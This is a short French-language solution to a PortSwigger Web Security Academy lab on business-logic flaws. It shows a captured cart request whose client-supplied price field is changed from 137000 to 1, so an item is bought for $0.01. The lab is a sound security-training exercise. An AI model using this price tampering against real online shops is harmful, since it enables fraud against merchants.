# Lab

https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls

## Solution

Lorsqu'on ajoute un produit dans le panier, dans la requête il y a le prix :

```http
POST /cart HTTP/2
Host: 0a6b00ec041e5c0480e6b256002a0014.web-security-academy.net
Cookie: session=JuBky2TIwyP0tWixXWYPQjgABkn05aLg
Content-Length: 44
Cache-Control: max-age=0
Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a6b00ec041e5c0480e6b256002a0014.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6b00ec041e5c0480e6b256002a0014.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7

productId=1&redir=PRODUCT&quantity=1&price=137000
```

On a juste à modifier la valeur de `price` à `1` pour que le produit soit ajouté au panier au prix de `$0.01`.

Ensuite on peut valider le panier pour acheter au prix modifié.